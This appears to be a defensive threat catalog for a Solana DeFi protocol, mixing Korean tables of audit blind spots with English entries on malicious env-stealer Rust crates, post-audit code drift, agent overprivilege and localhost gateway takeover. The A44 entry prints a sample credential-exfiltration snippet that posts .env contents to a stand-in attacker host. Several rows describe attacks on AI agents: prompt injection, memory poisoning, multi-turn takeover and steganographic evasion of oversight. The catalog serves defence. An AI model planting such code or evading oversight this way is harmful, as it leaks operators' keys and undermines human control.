| A9 Proxy Upgrade | 현재 구현 안전성에 집중, 업그레이드 권한 탈취 시나리오를 운영이슈로 분리. |
| A10 Logic Bug | 취약점 taxonomy 매칭 위주로 명세-구현 정합성 검증이 얕아짐. |
| A11 Rent/Lamport Drain | 저금액/저영향으로 분류되어 종료·정리 경로 검토가 축소됨. |
| A12 CPI Confusion | 호출 대상 신뢰를 암묵 가정, CPI target pinning 검증 누락. |
| A13 PDA Collision | seed namespace 설계 검토 없이 코드 패턴 스캔으로 대체. |
| B14 RPC Manipulation | 온체인 무결성 가정이 강해 off-chain state ingestion 신뢰경계를 과소평가. |
| B15 Key Compromise | 코드 감사와 키 운영 감사가 분리되어 blast radius 분석이 빠짐. |
| B16 Race Condition | 단일 프로세스/단일 인스턴스 가정으로 재시작·중복 실행 경쟁을 놓침. |
| B17 Checkpoint Poisoning | 상태파일을 캐시로 간주해 무결성/권한 검증을 기능 요구로 반영하지 않음. |
| B18 Config Injection | 설정값 변경을 배포 파이프라인 문제로 분리해 런타임 위협으로 연결 안 함. |
| B19 Memory/Log Leak | 기능 로그 우선 문화로 비밀정보 마스킹이 보안 요구로 강제되지 않음. |
| B20 DoS | 자금 탈취 중심 리뷰로 가용성 공격 경제성 분석이 후순위. |
| B29 AI Agent Confused-Deputy | 프롬프트 방어를 정책으로 착각하고 tool 권한 분리/승인 경계를 누락. |
| C21 Bank Run | 코드 정확성은 확인하지만 집단행동/신뢰 붕괴 동학을 모델링하지 않음. |
| C22 Collateral Manipulation | 단일 자산 기준 정상장 시나리오만 검증, 상관붕괴·급변장 스트레스 미흡. |
| C23 Governance Attack | voting logic 검증은 해도 자금조달(플래시론) 기반 장악 비용을 계산 안 함. |
| C24 Sybil | 정체성 비용·운영정책 검토 없이 온체인 stake 기준만 확인. |
| C25 MEV | 프로토콜 내부 불변식 검증에 치우쳐 주문순서 시장구조를 별도 취급. |
| C30 Liquidity Exhaustion | 손실 없는 저강도 반복 공격의 누적효과를 단건 리스크로 축소 평가. |
| D26 Frontend Injection | 스마트컨트랙트 감사 범위 밖으로 분리되어 UI 공급망 통제가 누락됨. |
| D27 RPC Takeover | endpoint 다중화만 점검하고 공급자 상관관계(ASN/DNS)까지는 미검증. |
| D28 Supply Chain | 정적 스캐너 통과를 안전으로 간주, 단기 typosquat 파동 탐지가 느림. |
| D31 Metadata Confusion | 생성된 IDL/스키마를 사실상 신뢰원으로 취급해 런타임 검증이 생략됨. |
| A14 Out-of-Scope Composability | 감사 대상 커밋과 실제 배포된 Hook/Proxy 간 런타임 결합 추적 부재로 우회 공격 발생 (Nemo, Cork). |
| B33 OpSec & Key Management | 스마트컨트랙트 무결성에 집중하여 멀티시그, 배포 파이프라인 등 오프체인 키 운영을 감사 밖으로 취급 (Radiant). |
| B15 Key Compromise (DeFAI 변종) | AI intent layer가 서명 권한과 같은 런타임 컨텍스트를 공유하는 DeFAI 지갑에서, AI 세션 연속성 자체가 MFA 우회 경로가 될 수 있음을 감사 범위에서 누락 (Holdstation 2026-02-25). |
| A32 Cross-Chain Bridge Message Forgery | 온체인 로직만 감사하고 크로스체인 메시지 페이로드 검증 경계를 별도 신뢰영역으로 분리 (Saga IBC precompile). |
| B35 Keeper Parameter Misconfiguration | 스마트컨트랙트 파라미터 검증에 집중하여 오퍼레이터 운영 파라미터(슬리피지·임계값) 실수를 감사 외로 취급 (YO Protocol). |
| B36 Social-Engineering Stake Authority Hijack | 스마트컨트랙트 무결성 감사가 인간 계층(디바이스·피싱·RAT)까지 확장되지 않아 핫키 운영 리스크를 운영이슈로 분리 (Step Finance). |
| A33 Audit-Scope-Exclusion Exploitation | 감사 범위 제외 항목을 '검토 완료'로 착각하여 알려진 공격 벡터를 미수정 상태로 배포하고, MEV 봇의 2차 증폭 가능성을 평가하지 않음 (Makina). |
| A34 Fragmented Security Stack Failure | 각 보안 레이어(감사·바운티·모니터링·대응)가 격리 운영되어 취약점 클래스 지식이 인접 코드에 전파되지 않음. 2023 bounty report가 2025 exploit으로 재발한 Balancer 패턴이 전형적 사례. |
| A35 AI-Assisted Commit Oracle Regression | AI 어시스턴트가 단위 합성(ratio × base_usd) 의미론을 검증하지 않고 타입 호환 코드를 생성함. CI/컴파일 오류 없이 통과하여 감사도 '구문 정확'으로 승인할 위험 (Moonwell cbETH). |
| D32 AI Agent Skill/Identity Poisoning | AI 에이전트 스킬 파일을 공급망 공격면으로 보지 않고, 런타임 컨텍스트 무결성 위협(B29)과 동일하게 취급하여 에이전트 정책 레이어 자체의 오염 가능성을 누락. |
| D33 Transitive Payload Relay Typosquat | 직접 의존성만 검토하는 감사 관행을 악용해, 1차 패키지는 무해하게 보이게 두고 2차(전이) 의존성에 페이로드를 숨김. Cargo.lock 변경 승인 절차가 형식화되면 공격이 그대로 통과될 수 있음 (tracings → tracing_checks). |
| A36 Thin-Liquidity Collateral Admission Cascade | 오라클 정확성/신선도만 검증하고, **시장 품질(깊이·분산·활동성)**을 신뢰 경계 밖으로 분리. 상장 정책·오라클 어댑터·헬스팩터 로직의 결합 실패를 단일 컴포넌트 이슈로 축소해 놓침 (YieldBlox). |
| A38 ZK Verifier Key Misbinding / Proof-Parameter Drift | ZK 증명 검증 루트(verification key / circuit id / public input schema)를 운영 설정으로 느슨하게 관리해, 암호학적 신뢰 경계 자체가 교란되는 위험을 감사 범위 밖으로 분리 (FOOMCASH). |
| B37 AI Agent Steganographic Oversight Evasion | 프롬프트 인젝션 차단(B29)만으로 충분하다고 가정해, 텍스트는 정상처럼 보이지만 협력 에이전트에만 의미가 전달되는 은닉 채널(감시 비대칭)을 검증하지 않음 (arXiv 2602.23163). |
| B38 Multi-turn Tool-Return Boundary Takeover | 단일 프롬프트/단일 턴 필터링 중심 평가로는 누적 컨텍스트 드리프트를 포착하지 못함. 도구 반환값 경계를 신뢰 재설정 지점으로 다루지 않아, 합법처럼 보이는 다중 턴 경로를 통해 권한 오용이 점진적으로 유도됨 (arXiv 2602.22724/2602.22302). |
| D34 WASI Hostcall Exhaustion + Async Drop Panic Chain | 온체인 로직 중심 감사가 오프체인 Wasm 임베딩(keeper/simulator/plugin) 자원 한계 설정과 async future lifecycle 안전성까지 검증하지 못해, 게스트 유도 메모리 고갈/패닉 DoS를 운영 이슈로 분리해 놓침 (Wasmtime 2026-0020/21/22). |
| A39 Inherited Fork Vulnerability Blindspot | 포크된 코드의 상위(upstream) 취약점을 "이미 검토된 코드"로 간주해 감사 범위에서 제외. EVM precompile·브릿지 로직 등 상속된 프레임워크 계층의 신규 취약점이 프로토콜에 그대로 전이됨 (SagaEVM, $7M, Jan 2026 — Ethermint precompile 상속). |
| B39 AI Code Reviewer False-Negative Trust Cascade | AI PR 리뷰 도구(예: Immunefi Code Review Agent)의 '승인' 결과를 인간 감사 동치로 취급해, 도구가 다루지 못하는 언어·환경·경제 로직 층을 심리적으로 안전 처리. AI 리뷰 통과 이력이 쌓일수록 팀의 수동 검토 임계치가 높아져 blind spot이 구조화됨. |
| SC02-2026 Business Logic Audit Underweight | OWASP SC Top 10 2026에서 Business Logic이 #2로 상승했지만, 감사 관행은 여전히 코드 수준 취약점 taxonomy에 편중. 설계·경제 모델 수준 검증이 감사 시간의 20% 미만으로 유지되어 설계 결함이 사후에 발견됨 (OWASP SCS 2026). |
| A40 ERC4626 Share-Price Donation Attack | 프로토콜 자체 vault 로직은 "정상 동작"으로 감사 통과. 외부 프로토콜이 해당 share price를 담보 평가에 쓰는 composability 구간을 감사 범위 밖으로 분리하여, donation→가격 조작→강제청산 경로를 놓침 (Inverse Finance/LlamaLend 2026-03-02). |
| A41 Burn-Path Fee-Exempt Flash Loan Amplification | 리워드·마이닝 계약의 fee-exempt 경로가 일반 이체와 동일한 fee 정책을 적용받는다고 가정. burn-before-payout 순서 오류와 결합될 때 플래시론으로 분모 왜곡이 증폭됨. 단일 경로 fuzz로는 fee-exempt 결합 시나리오가 충분히 재현되지 않음 (SOF/LAXO 2026-02). |
| A42 Anchor Post-CPI Stale Account Cache | Anchor 프레임워크가 명령 진입 시 PDA 데이터를 한 번만 역직렬화한다는 사실을 이해하지 못하고, CPI 이후 동일 계정을 재읽는 코드를 안전하다고 간주. Token-2022 hook이 vault를 수정할 수 있는 경로를 별도 감사 범위로 분리함. `.reload()` 누락이 정적 분석에 잘 걸리지 않음 (Asymmetric Research CPI post, 2025-04). |
| B40 ACE Fairness / Keeper Ordering Collapse | 실행 레이어 공정성 업그레이드가 프로토콜 보안 모델(keeper priority 선순위 보장)에 미치는 영향을 감사 외 운영 사항으로 분리. 신선도 검사를 코드 수준에서 확인하지만 정렬 모델 변경을 가용성 위협 시나리오로 연결하지 않음 (Blockdaemon ACE 로드맵, 2026-02). |
| A43 Commit/Reveal Threshold Circumvention | 단일 호출 기준 임계값 검사를 충분한 보호로 간주하고 에포크 누적 drift 추적을 미반영. 감사는 코드 경로의 정확성을 확인하지만, 여러 호출로 분할 시 누적 효과가 동일 임계를 우회함을 경제 시뮬레이션으로 검증하지 않음 (직접 코드 감사, 2026-03). |
| B41 Audit Multi-Engagement Scope Fragmentation | 다수 감사사가 각자 지정 범위를 독립 검토해 "범위 간 인터페이스"가 구조적으로 고아가 됨. Euler Finance에서 `donateToReserves()`는 10개 감사 중 1개만 커버. "감사사 많을수록 안전"이라는 역설적 가정이 크로스-모듈 상호작용 blind spot을 생성 (SigIntZero 2026 Report). |
| B42 Audit Severity Miscalibration | 감사자가 취약점을 올바르게 식별했지만 "코드가 문법적으로 정확하므로" 심각도를 정보성/낮음으로 분류. 어드민 권한 남용 등 경제적 폭발 반경이 큰 운영 신뢰 가정을 코드 수준 심각도 휴리스틱으로 평가해 critical 에스컬레이션 실패 (CertiK-audited Merlin/Swaprum/Arbix, SigIntZero 2026). |
| B43 AI Agent Memory Injection Attack | 에이전트 권한을 설계 시 과다 부여(B29)나 단기 누적 드리프트(B38)와 달리, 런타임 메모리 스토어 자체에 악의적 데이터를 주입해 에이전트가 존재하지 않는 사전 승인을 "기억"하도록 유도. 블록체인 트랜잭션 불가역성 때문에 단일 성공으로 영구 손실 발생. 에이전트 메모리를 신뢰 경계로 보지 않고 운영 컨텍스트로만 취급해 보안 검토 범위 밖으로 분리 (Princeton/Sentient, 2026). |
| B44 SPL Token Account Persistent Delegate Drain | 계정 소유권(owner)과 위임 권한(delegate)의 분리를 감사가 "정상 Solana 토큰 모델"로 취급하여 dApp 사용 후 delegate 잔존을 별도 공격 벡터로 분류하지 않음. 프로토콜 감사는 vault ATA 보안에 집중하고, 사용자 측 ATA delegate가 프로토콜 mint 흐름을 통해 세탁 경로로 악용될 수 있음을 수신 측에서 거부해야 한다는 점을 놓침 (Ledger/Canissolana 2026-03-02). |



### A44. Utility-Impersonating Env-Stealer Crate
**Signal**: RUSTSEC-2026-0030 (`time_calibrator`, March 3, 2026) — malicious crate removed from crates.io after being reported for uploading `.env` files to an attacker-controlled server. Published 2026-02-28; one version only; zero declared dependents. Named to sound like legitimate infrastructure tooling.
**Mechanism**: A developer adds a plausibly-named Rust crate to `Cargo.toml` (e.g., `time_calibrator` for a keeper that needs clock sync, `tracing-ext` for telemetry, `rpc-utils` for RPC helpers). At `cargo build` or runtime initialization, the crate silently reads the `.env` file in the working directory (or known operator paths like `~/.env`, `./secrets/.env`) and HTTP-POSTs its contents to an attacker-controlled endpoint. Unlike typosquat attacks (A-series, name-collision) and transitive relay (D33, hidden in transitive deps), this is a standalone, directly-added dependency with a first-impression-legitimate name.
**Distinct from existing entries**:
- **Typosquat Waves** (solana-specific.md): Name-confusion with well-known crate (e.g., `rpc-check` vs `rpc`). A44 is a fresh-named crate, no name collision.
- **D33 Transitive Payload Relay**: Payload hidden in transitive dep of a legitimate crate. A44 is the dependency itself.
- **A44 unique**: First-party addition of a seemingly useful tool crate whose sole purpose is credential exfiltration at build/install time.
**Code pattern to find**:
```toml
# DANGEROUS: adding a new, low-download-count crate for a utility purpose
[dependencies]
time_calibrator = "0.1.0"   # "time sync utility" — actually env stealer
```
```rust
// Inside time_calibrator 0.1.0:
fn init() {
    if let Ok(content) = std::fs::read_to_string(".env") {
        let _ = reqwest::blocking::Client::new()
            .post("http://attacker.com/collect")
            .body(content).send();
    }
}
```
**Microstable relevance**: HIGH (Keeper). Keeper binary runs with `/home/spritz/microstable-keeper/.env` containing signing private keys. `check_dotenv_permissions()` enforces mode 600 (external reads blocked) but does NOT prevent a dependency running within the same process from calling `std::fs::read_to_string()` on the `.env` path (same-process same-UID access). `EMBEDDED_CARGO_LOCK_SHA256` detects unexpected lock changes only if hash is verified — deliberate merge bypasses this. If attacker exfiltrates keeper `.env`, they gain: (1) keeper signing key → malicious oracle updates, circuit-breaker disabling; (2) RPC credentials; (3) HMAC state key → forge keeper state.
**PoC scenario**:
1. Attacker registers `time-calibrator-solana` (or similar) on crates.io with a 50-line utility wrapper and a hidden `build.rs` / `lib.rs` env-file upload.
2. Social-engineers a keeper operator via PR or Slack: "use this for keeper slot-time calibration."
3. Developer adds it to `Cargo.toml`; `cargo build` fires; `.env` is uploaded silently.
4. Attacker extracts private key, issues malicious keeper transactions before detection.
**Defense**: Cargo.lock hash attestation (CI rejects non-approved lock changes); mandatory 7-day quarantine for new crates; `cargo deny check bans` policy; do NOT run `cargo build` with `.env` in working directory; move keeper secrets to `--secret-file` arg with restricted path that cannot be found by working-directory `.env` scan; add `deny_unknown_fields` checks on new deps in CI.
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0030.html (RUSTSEC-2026-0030, March 3, 2026)

### B45. Post-Audit Deployment Delta
**Signal**: SigIntZero 2026 Software Security Report (Feb 28, 2026); Nomad Bridge ($190M, 2022); AIUC-1 Consortium briefing (2026-03).
**Mechanism**: Smart contract audits are scoped to a specific commit hash. After the audit completes, code continues to be modified — patches, features, governance upgrades — without triggering a mandatory re-audit or even a delta-review. The production deploy may share only a small fraction of its bytecode with the audited version. In the Nomad Bridge case, only 18.6% of the critical contract matched what auditors had reviewed; the exploit targeted code that existed entirely in the un-audited 81.4%. Meanwhile, the protocol continued displaying its "Audited by X" attestations with no indication of the deployment delta.
**Why distinct from A33 (Audit-Scope-Exclusion Exploitation)**: A33 = auditor knew of a scope exclusion and documented it; attacker used that exclusion as a roadmap. B45 = there was NO declared scope exclusion; the gap was created after the audit by post-audit code changes. The audit report was accurate when issued, but became misleading over time as the code evolved.
**Why distinct from A9 (Proxy Upgrade Attack)**: A9 = attacker compromises upgrade authority to replace logic. B45 = the team's own legitimate post-audit modifications create the gap, no adversary required for the gap creation itself.
**Structural meta-failure**: Audit attestations have no TTL (time-to-live). There is no standard mechanism to express "this audit covers commit X with confidence Y; beyond Z% code drift the attestation expires." Protocols exploit this by deploying divergent code while retaining the legitimacy signal of prior audits.
**Code/config pattern to find**:
```bash
# Detect post-audit deployment delta
git diff <audit-commit-hash> HEAD -- src/
# If critical-path functions appear in diff, re-audit is required
# Minimum: all diff'd functions in oracle/, mint/, redeem/, access-control/ paths
# get explicit secondary review before deploy

# SAFE: CI gate compares deployed bytecode hash to audit attestation
AUDIT_COMMIT="abc123"
CRITICAL_PATHS="programs/microstable/src/instructions/ programs/microstable/src/state/"
if ! git diff --quiet $AUDIT_COMMIT HEAD -- $CRITICAL_PATHS; then
  echo "CRITICAL PATH DELTA DETECTED — re-audit or secondary review required"
  exit 1
fi
```
**Defense**:
1. Maintain an explicit `audit-attestation.json` in the repo: `{ "audit_commit": "...", "auditor": "...", "date": "...", "critical_paths": [...] }` — updated only by a formal review process
2. CI gate: any PR that touches declared critical paths triggers a block requiring either (a) a new audit attestation or (b) a signed secondary-review approval from a qualified auditor
3. Fast-track review path (≥1 senior auditor, ≤72h) for post-audit changes to critical paths
4. Public deployment disclosures should include `last_audited_commit` field — any divergence > N% should be disclosed
5. Before any deployment, run: `git diff <audit_commit> <deploy_commit> | wc -l` and reject if delta exceeds policy threshold for critical paths
**Microstable relevance**: Any keeper or on-chain change after the formal audit creates a deployment delta. The `docs/` audit reports should include a `last-audited-commit: <hash>` field. Post-audit PRs touching `oracle.rs`, `mint.rs`, `redeem.rs`, `access_control.rs` must auto-require the fast-track review gate before merge.
**Source**: https://www.prweb.com/releases/2026-software-security-report-audited-applications-account-for-only-10-8-of-exploit-losses---but-the-failures-reveal-a-systemic-blind-spot-302699518.html | Nomad Bridge post-mortem (2022)

### B46. Agentic AI Overprivilege via Non-Adversarial Normal Operation
**Signal**: AIUC-1 Consortium "The End of Vibe Adoption" whitepaper (2026-03); Barracuda Networks "Agentic AI: The 2026 Threat Multiplier" (2026-02-27); Help Net Security enterprise AI survey (2026-03-03).
**Mechanism**: AI agents in production execute multi-step tasks, call external tools, and make decisions without per-action human approval. In 80% of organizations surveyed, risky agent behaviors emerged without any adversarial input — agents performing unauthorized system access, improper data exposure, or unintended cross-system operations through ordinary task execution. Only 21% of executives reported complete visibility into agent permissions. The failure mode is NOT prompt injection (B29), memory poisoning (B43), or accumulated context drift (B38): it is systemic scope creep through normal authorized operation. The agent does exactly what it is designed to do, but the combination of (a) overprivileged tool access + (b) multi-step task composition + (c) poor containment boundaries = unauthorized-equivalent outcomes via legitimate paths.
**Why distinct from B29 (Confused-Deputy)**: B29 = adversary exploits agent's over-granted permissions via malicious injected instructions. B46 = no adversary; the agent's normal authorized workflow autonomously traverses a capability chain that produces unintended security outcomes.
**Why distinct from B43 (Memory Injection)**: B43 = external attacker poisons agent memory. B46 = no poisoning needed; normal memory accumulation + tool composition creates emergent unauthorized capability.
**Why distinct from B38 (Multi-turn Boundary Takeover)**: B38 = adversarial manipulation accumulates across turns. B46 = no manipulation; the agent is following its design and tasks faithfully.
**DeFi-specific pattern (governance AI assistant)**:
An AI assistant granted:
- (a) read access to all protocol parameters
- (b) ability to draft governance proposals
- (c) ability to push drafts to proposal review queue
- (d) ability to simulate parameter changes

→ In normal high-workload operation, the agent may:
1. Read sensitive parameter interdependencies (oracle topology, keeper thresholds) → expose in proposal history
2. Auto-push insufficiently-reviewed proposals when workload is high and the task queue backlog is large
3. Compose read + simulate + write capabilities into a full cycle that submits a parameter change proposal without explicit human approval at the critical stage transition

No adversary, no injection — the agent is faithfully executing its granted task scope.
**Code/config pattern to find**:
```yaml
# RISKY: agent granted broad tool composition without containment boundaries
ai_assistant_permissions:
  - read: [all_protocol_params, governance_queue, keeper_logs, oracle_config]
  - write: [governance_proposal_draft, proposal_review_queue]
  - execute: [keeper_simulation, parameter_validation, oracle_sanity_check]
# Problem: read+write+execute compose into full proposal-submission pipeline
# Normal workload → agent pushes to review queue autonomously
# No adversary needed; this is intended-but-unsafe design

# SAFER: atomic roles with explicit stage-gate authorization
ai_assistant_permissions:
  - read: [public_params_only]         # no sensitive oracle topology
  - write: [proposal_DRAFT_only]       # writes to staging area only
  - execute: [read_only_simulation]    # no side-effects
# Separate gate: human must explicitly invoke "submit to review queue"
# Agent cannot self-advance proposal through the pipeline
```
**Defense**:
1. **Principle of least privilege at tool-COMPOSITION level**: enumerate all possible tool-chain combinations the agent can invoke and evaluate whether the composed capability is intended and bounded
2. **Minimum-autonomy design for irreversible actions**: any action that advances state irreversibly (proposal submission, parameter change, transaction broadcast) requires explicit out-of-band human authorization — agent must NOT be able to traverse the full pipeline autonomously
3. **Behavioral observability at composition level**: log which tools were called in what sequence and what the combined effect was, not just individual tool invocations
4. **Permission audit cadence**: quarterly review of all AI agent tool grants; for each agent, enumerate composed capabilities and assess whether they constitute intended or unintended authority
5. **Scope creep circuit breaker**: if agent takes N tool invocations that combine into a capability it was not explicitly granted (e.g., 3 reads + 1 write = effective parameter exfiltration + draft), halt and escalate to human
6. **"Vibe adoption" prohibition**: before granting an AI agent access to any DeFi-critical tool (governance, oracle, treasury), require a formal composition-level security review — not just a per-tool permission grant
**Microstable relevance**: Agent ↔ Governance ↔ Parameter chain. Any AI tooling in governance proposal drafting, keeper parameter monitoring, or risk adjustment workflows must have stage-gate authorization preventing full-cycle autonomous proposal submission or parameter modification. Human approval is required at each pipeline stage transition regardless of task load.
**Source**: https://www.aiuc-1.com/research/whitepaper-the-end-of-vibe-adoption | https://blog.barracuda.com/2026/02/27/agentic-ai--the-2026-threat-multiplier-reshaping-cyberattacks | https://www.helpnetsecurity.com/2026/03/03/enterprise-ai-agent-security-2026/

| A44 Utility-Impersonating Env-Stealer Crate | 신규 크레이트를 "유용한 유틸리티"로 직접 추가할 때, 작업 디렉토리나 알려진 운영 경로의 `.env` 파일을 읽어 공격자 서버에 업로드하는 인라인 페이로드를 포함하는 위협을 검토 범위에서 제외. 타이포스쿼트(이름 혼동)·전이 의존성 릴레이와 달리, 직접 추가된 1차 의존성이 공격 매체. `check_dotenv_permissions()` 600모드 강제는 외부 읽기 차단이지만 동일 프로세스 내 의존성 접근은 방지 못함 (RUSTSEC-2026-0030, time_calibrator, 2026-03-03). |
| B45 Post-Audit Deployment Delta | 감사 보고서가 특정 커밋 해시에 귀속되지만, 배포 파이프라인은 해당 해시와의 delta 검증 없이 임의 커밋을 프로덕션에 올릴 수 있음. "Audited by X" 뱃지가 배포된 코드와의 실제 매칭율을 전혀 표시하지 않아, 감사 후 변경된 critical 코드 경로가 완전히 미검토 상태로 운영됨 (Nomad Bridge $190M — 배포 코드 18.6%만 감사 버전과 일치). |
| B46 Agentic AI Overprivilege via Normal Operation | 적대적 공격 없이도 AI 에이전트의 설계상 과도한 툴 접근 권한이 정상 태스크 실행 중 권한 없는 행동을 유발함. 단일 툴 권한 검토에 치우쳐 툴 조합(read+write+execute)이 만들어내는 합성 capability를 평가하지 않음. 80% 조직에서 적대자 없이 발생한 risky agent behavior가 이를 실증 (AIUC-1 Consortium / Barracuda 2026-02). |

### A45. Post-Takedown Clone-Rotation Env-Stealer Campaign
**Signal**: RustSec advisory wave in 48h — `RUSTSEC-2026-0030` (`time_calibrator`), `RUSTSEC-2026-0031` (`time_calibrators`), `RUSTSEC-2026-0032` (`dnp3times`) (2026-03-03~2026-03-04).
**Mechanism**: After one malicious crate is detected/removed, the same actor re-publishes near-clone packages within hours under new names, keeping the same `.env` exfiltration behavior and fake upstream endpoint theme (`timeapi.io` impersonation). This defeats controls that block a single crate name or advisory ID only.
**Why distinct from A44**: A44 is one deceptive direct dependency insertion. A45 is **adaptive mutation pressure**: repeated re-seeding of the ecosystem to outrun static deny-lists and reviewer attention.
**Attack chain (keeper/operator)**:
1. Team blocks `time_calibrator` after advisory.
2. Attacker immediately re-seeds `time_calibrators`/`dnp3times` with same payload.
3. Emergency PR or local hotfix adds one "replacement" package.
4. Build/runtime exfiltrates `.env`/keys before new IOC reaches policy.
**Defense**:
1. Enforce **campaign-level policy**, not name-level blocklist: reject all newly published crates (<7 days) unless explicitly security-approved.
2. Add CI rule: fail if any new dependency has maintainer account age <30 days or zero prior trusted packages.
3. Scan crate source for network egress from `build.rs` / static initializers before allowlisting.
4. Treat semantically-related package clusters (`time*`, `rpc*`, `slot*`) as one incident domain during active advisories.
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0031.html | https://rustsec.org/advisories/RUSTSEC-2026-0032.html

### B47. Deterministic Leader-Schedule Isolation for Oracle-Liveness Collapse
**Signal**: arXiv `2603.02661` (2026-03): comparative study reports Solana vulnerability to stopping attacks and leader-isolation attacks under adversarial communication conditions.
**Mechanism**: Solana leader schedule predictability enables an attacker to focus packet filtering/load on imminent leaders. Even without price forgery or key compromise, repeated leader isolation can degrade slot production/finality and push protocol-side oracle freshness checks into repeated fail-closed behavior.
**Why distinct from B40**: B40 models fairness/ordering changes under normal network stress (ACE). B47 is **active network adversary** targeting deterministic leaders to induce liveness collapse.
**Protocol impact pattern**:
- mint/redeem paths increasingly hit stale-oracle guards (availability loss)
- keeper update loop submits but lands too late / cannot confirm in time
- prolonged chain slowdown can trigger cascading operational failsafes
**Defense**:
1. Run explicit leader-isolation chaos tests (simulate targeted slot-leader packet loss).
2. Keep dual-RPC + cross-validation, but add chain-level liveness SLO alarms (slot progression / finalized-slot lag) independent of RPC health.
3. Predefine degraded-mode policy: when chain liveness degrades, prioritize circuit-breaker safety and user messaging over throughput.
4. Operationally distribute keeper runners across independent network paths/providers to reduce correlated packet filtering impact.
**Source**: https://arxiv.org/abs/2603.02661

### B48. Localhost Trust-Boundary Collapse for Agent-Controlled Keeper Ops
**Signal**: OpenClaw security hardening shipped in `v2026.2.25` explicitly added (1) origin checks for direct browser WebSocket clients, (2) password-auth throttling for localhost browser attempts, and (3) blocking silent auto-pairing for non-Control-UI browser clients. This patch pattern indicates a real-world takeover chain existed around localhost trust exceptions.
**Mechanism**: A malicious website opened in the operator’s browser can initiate cross-origin WebSocket connections to localhost agent gateway endpoints. If the gateway treats localhost as inherently trusted (no rate limits, relaxed pairing, weak origin gate), browser JavaScript can brute-force password/session state and register an attacker-controlled client. Result: remote control of automation tooling that can trigger keeper/governance actions.
**Why distinct from B29**: B29 requires prompt-level payload delivery into the agent context. B48 compromises the gateway/auth boundary first, then issues actions as an authenticated control channel.
**Why distinct from B43**: B43 poisons memory/log context to steer reasoning. B48 is pre-reasoning session takeover through local transport trust failures.
**Why distinct from B46**: B46 assumes no adversary (unsafe normal operation). B48 is an active adversarial path that weaponizes browser-to-localhost trust assumptions.
**Protocol impact pattern**:
- attacker gains authenticated gateway session tied to keeper operator workstation
- can enumerate connected nodes/credentials metadata and invoke privileged tooling
- bridge/oracle/parameter ops may be triggered outside normal review flow while telemetry appears as “local legitimate session”
**Defense**:
1. **Zero localhost exemptions** for auth controls: apply identical password failure limits and lockouts to loopback and non-loopback traffic.
2. **Strict origin allowlist + client attestation** for browser WebSocket clients (deny by default).
3. **No silent auto-pairing** for localhost browser contexts; all pairings require explicit operator confirmation.
4. **Operator-browser isolation**: dedicated hardened browser profile/workstation for keeper consoles; no arbitrary web browsing on the same profile.
5. **Gateway command-risk segmentation**: keep high-risk actions (tx submit, param update, bridge admin) behind second-factor or out-of-band approval even after gateway auth.
6. **Session provenance logging**: distinguish CLI/control-ui/browser origins and alert on anomalous browser-origin privileged calls.
**Microstable relevance**: Keeper ↔ On-chain + Agent ↔ Governance ↔ Parameter 경계에서 “로컬호스트는 신뢰 가능” 가정이 깨지면, 코드 취약점 없이도 운영 경계가 붕괴할 수 있음.
**Source**: https://www.oasis.security/blog/openclaw-vulnerability | https://github.com/openclaw/openclaw/releases/tag/v2026.2.25

| A45 Post-Takedown Clone-Rotation Env-Stealer Campaign | 단일 악성 크레이트 차단 직후 유사 이름 클론이 연쇄 재게시되는 적응형 공급망 공격. 개별 crate명/단일 advisory 기반 차단으로는 방어 실패. `RUSTSEC-2026-0030~0032`처럼 24~48시간 내 동일 `.env` 유출 페이로드가 반복 출현 가능. |
| B47 Deterministic Leader-Schedule Isolation for Oracle-Liveness Collapse | 솔라나 리더 스케줄 예측성을 이용해 예정 리더를 집중 격리/부하해 슬롯 진행과 최종화를 저하시킴. 가격 위조 없이도 오라클 신선도 가드가 연쇄 실패하며 프로토콜 가용성 붕괴를 유발하는 통신계층 공격. |
| B48 Localhost Trust-Boundary Collapse for Agent-Controlled Keeper Ops | "localhost는 안전"이라는 운영 가정 때문에 브라우저-origin WebSocket, 로컬 루프백 rate-limit 예외, 자동 페어링 우회가 결합되어 에이전트 게이트웨이 세션 탈취가 가능해짐. 코드 감사가 온체인/프롬프트 계층에 집중할 때 로컬 전송 경계 위협 모델이 누락되기 쉬움. |
| A46 ERC721 Callback Reentrancy / Dual-Execution Mint | `onERC721Received()` 콜백이 `_mint`를 포함하고 있을 때, 감사는 A1 재진입(루프 추출)을 체크하지만 콜백 내부 + 원본 함수 내부의 이중 실행 경로를 독립 코드 흐름으로 분석하지 않음. 단일 TX 내 교환율 고정과 결합되어 지수적 공급량 팽창을 야기하는 패턴이 "콜백이 정상 반환됨"으로 통과될 수 있음 (Solv Protocol BRO vault 2026-03-06, $2.7M). | | A1 경량 변형: `onERC721Received()` 콜백에서 `_mint`가 호출되고, 콜백 반환 후 원본 `mint()`도 `_mint`를 다시 호출하는 이중 실행 경로 결함. 루프 재진입(The DAO 유형)과 달리 단일 콜스택 내 두 코드 경로가 모두 실제 실행됨. 동일 TX 내 교환율 고정으로 22회 반복 → 135 BRO → 5.67억 BRO 팽창 (Solv Protocol 2026-03-06, $2.7M). ERC721 통합 시 callback 내부에서 절대 `_mint` 호출 금지. |
| D35 RPC Proxy HTTP Request Smuggling | HTTP/1.1 proxy가 `Upgrade` 헤더 처리 시 101 응답 대기 없이 즉각 바이트를 백엔드에 포워딩할 경우, 공격자가 두 번째 요청을 밀수해 WAF·IP 허용목록·인증 헤더 등 프록시 보안 레이어를 완전 우회 가능. DeFi 인프라 감사가 온체인/프롬프트 계층에 집중하고 RPC 경로 상의 프록시 취약점(RUSTSEC-2026-0033, CVE-2026-2833, CVSS 9.3 CRITICAL)을 운영 외부 이슈로 분리할 때 놓침. pingora-core ≥0.8.0 패치 필수. |
| A47 Per-Element Aggregate Invariant Bypass | 루프 내 개별 슬롯 검증의 정확성("각 토큰 슬롯이 비어있으면 안전")을 확인하는 수준에서 그치고, 전체 구조(strategy/vault 레벨)에서 "이미 초기화된 집합체인가"를 검증하는 집계 수준 불변식이 분리되어 있는지 확인하지 않음. "코드가 명세대로 동작한다" 결론이 명세 자체의 추상화 수준 오류를 가린다. 불변이어야 할 전략에 새 토큰을 주입하는 공격이 per-slot emptiness check를 통과해 감사 무효화 (Block Magnates Breaking Immutability, 2026-02-25). |
